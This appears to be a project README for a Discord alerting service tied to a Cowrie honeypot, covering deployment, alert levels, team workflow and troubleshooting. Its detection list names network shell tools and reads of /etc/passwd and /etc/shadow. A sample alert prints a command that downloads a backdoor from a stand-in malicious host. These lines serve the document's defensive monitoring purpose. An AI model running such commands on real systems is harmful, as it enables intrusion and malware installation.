# Discord Webhook Monitoring System

## 🚨 Real-Time Honeypot Alerts for Your Team

This system provides instant Discord notifications when attackers interact with your Cowrie honeypot. Perfect for team-based security monitoring and incident response.

## ⚡ Quick Start

### 1. Create Discord Webhook
- Go to your Discord server → Channel settings → Integrations → Create Webhook
- Copy the webhook URL (keep it secret!)

### 2. Deploy to Honeypot
```bash
# Upload files to your AWS honeypot
scp -i your-key.pem 02-Deployment-Scripts/* ubuntu@your-honeypot-ip:~/

# SSH to honeypot and deploy
ssh -i your-key.pem ubuntu@your-honeypot-ip
chmod +x deploy_discord_monitor.sh
sudo ./deploy_discord_monitor.sh
```

### 3. Configure Webhook
```bash
# Edit config file
sudo nano /opt/cowrie/discord-monitor/discord_config.json

# Replace webhook URL and test
sudo -u cowrie python3 /opt/cowrie/discord-monitor/test_webhook.py
```

### 4. Start Monitoring
```bash
sudo systemctl enable cowrie-discord-monitor
sudo systemctl start cowrie-discord-monitor
```

## 🎯 Alert Types

| Alert | Color | Description | Action Required |
|-------|--------|-------------|-----------------|
| 🚨 **Successful Login** | Red | Attacker broke in! | **Immediate investigation** |
| 📤 **File Upload** | Red | Malware installation attempt | **Immediate analysis** |
| ⚠️ **Suspicious Command** | Orange | Interesting attacker behavior | Document techniques |
| 📥 **File Download** | Orange | Data theft attempt | Monitor activity |
| 🔒 **Failed Login** | Blue | Normal brute force | Track patterns |
| 💻 **Command Executed** | Blue | Basic system exploration | Optional review |

## 🛠️ Configuration

### Alert Levels (discord_config.json)
```json
{
  "alert_levels": {
    "login_success": true,     // 🚨 Critical - always enable
    "login_failed": false,     // Can be spammy
    "command_executed": true,  // Useful for analysis
    "file_upload": true,       // 🚨 Critical - always enable
    "file_download": true,     // Important for data theft detection
    "session_start": false,    // Usually too noisy
    "session_end": false       // Not usually needed
  }
}
```

### Interesting Commands
The system flags these commands as high-priority:
- **Reconnaissance**: `whoami`, `id`, `uname`, `ps`, `netstat`
- **Network Tools**: `wget`, `curl`, `nc`, `nmap`, `masscan`
- **Privilege Escalation**: `sudo`, `su`, `passwd`
- **System Access**: `cat /etc/passwd`, `cat /etc/shadow`
- **Persistence**: `crontab`, `systemctl`, `service`

## 📋 Team Workflows

### Discord Channel Setup
- **#honeypot-alerts** - All automated alerts
- **#honeypot-critical** - High-priority alerts only
- **#honeypot-discussion** - Team analysis and findings

### Response Procedures
1. **See an alert** → React with 👀 (acknowledged)
2. **Critical alert** → Investigate immediately
3. **Document findings** → Share in discussion channel
4. **Update threat database** → Record new attack patterns

## 🔧 Management Commands

```bash
# Service Management
sudo systemctl status cowrie-discord-monitor
sudo systemctl restart cowrie-discord-monitor
sudo journalctl -u cowrie-discord-monitor -f

# Testing
sudo -u cowrie python3 /opt/cowrie/discord-monitor/test_webhook.py

# Quick Setup (for team members)
./quick_setup_discord.sh

# Manual Start (for debugging)
sudo -u cowrie /opt/cowrie/discord-monitor/start_monitor.sh
```

## 🛡️ Security Features

- **Secure Configuration**: Webhook URLs stored with restricted permissions
- **User Isolation**: Runs as unprivileged `cowrie` user
- **Rate Limiting**: Prevents Discord API abuse
- **Log Rotation**: Automatic cleanup of old logs
- **Git Protection**: Webhook URLs excluded from version control

## 📊 Sample Alerts

### Successful Login Alert
```
🚨 SUCCESSFUL LOGIN DETECTED!
Attacker successfully logged in!

IP Address: 192.168.1.100
Username: admin
Password: admin123

Source IP: 192.168.1.100
Credentials: admin:admin123
```

### Suspicious Command Alert
```
⚠️ SUSPICIOUS COMMAND EXECUTED!
Command: wget http://malicious.com/backdoor.sh

Source IP: 192.168.1.100
Session: a1b2c3d4...

Command:
```bash
wget http://malicious.com/backdoor.sh
```
```

### File Upload Alert
```
📤 FILE UPLOAD DETECTED!
Attacker uploaded a file!

Filename: backdoor.py
Source IP: 192.168.1.100

Filename: backdoor.py
Source IP: 192.168.1.100
Action: Uploaded
```

## 🚀 Advanced Features

### Multiple Webhook Channels
```json
"notification_channels": {
  "general": "https://discord.com/api/webhooks/general-channel",
  "critical": "https://discord.com/api/webhooks/critical-channel"
}
```

### IP Filtering
```json
"high_priority_ips": ["known.bad.ip.1", "known.bad.ip.2"],
"ignored_ips": ["10.0.0.0/8", "internal.scanner.ip"]
```

## 🔍 Troubleshooting

### Common Issues

**No alerts appearing:**
```bash
# Check if Cowrie is logging
sudo tail -f /opt/cowrie/var/log/cowrie/cowrie.json

# Verify service is running
sudo systemctl status cowrie-discord-monitor
```

**Service won't start:**
```bash
# Check logs for errors
sudo journalctl -u cowrie-discord-monitor --no-pager

# Verify configuration
sudo -u cowrie python3 /opt/cowrie/discord-monitor/test_webhook.py
```

**Too many alerts:**
- Set `login_failed: false` in configuration
- Add noisy IPs to `ignored_ips`
- Increase `rate_limit_delay`

### Testing the System

Generate test activity:
```bash
# From another machine, try to connect
ssh -p 2222 admin@your-honeypot-ip

# Try common credentials:
# admin/admin, root/123456, ubuntu/ubuntu
```

## 🤝 Team Collaboration

### Best Practices
- Always acknowledge alerts with reactions
- Document interesting attack patterns
- Share webhook URLs securely (never in git/chat)
- Review alert rules weekly as a team
- Rotate webhook URLs monthly

### Daily Checklist
- [ ] Check for overnight alerts
- [ ] Verify monitoring service is running
- [ ] Review any critical incidents
- [ ] Update team on new attack patterns
